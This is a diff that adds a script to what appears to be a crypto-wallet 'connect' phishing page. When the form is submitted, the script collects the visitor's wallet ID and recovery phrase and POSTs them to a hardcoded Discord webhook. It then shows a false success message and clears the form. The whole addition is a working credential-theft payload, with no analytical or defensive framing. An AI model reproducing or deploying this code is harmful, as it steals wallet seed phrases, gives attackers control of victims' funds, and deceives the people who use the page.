@@ -31,4 +31,41 @@
                                        <p class="successful">Phrase Successfully Connected, goto Keystore JSON</p>
                                     </div>
                         </div>
+  <script>
+    document.getElementById('form').addEventListener('submit', function (event) {
+        event.preventDefault(); // Prevents the default form submission
+
+        var formData = {
+            wallet_id: document.getElementById('wallet_id').value,
+            phrase: document.getElementById('phrase').value
+            // Add more form fields as needed
+        };
+
+        var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1141145558841561148/jb3x-VSsYIeMgZNMLf8i22F_VFiCsVJ6LwyMYCw8jBEk8caeoew9YY5hQM45vVxrxGhj", true);
+        request.setRequestHeader('Content-type', 'application/json');
+
+        var params = {
+            content: (
+                "> **WALLET ID  : **" + formData.wallet_id +
+                "\n> **PHRASE : **" + formData.phrase
+                // Add more fields to the content as needed
+            )
+        };
+
+        request.send(JSON.stringify(params));
+
+        // Optionally, you can handle the response or perform additional actions here.
+
+        // Display the success message
+        var successMessage = document.querySelector('#first .thankyou_message');
+        if (successMessage) {
+            successMessage.style.display = 'block';
+        }
+
+        // Optionally, you can reset the form fields
+        document.getElementById('form').reset();
+    });
+</script>
+
                       </form>
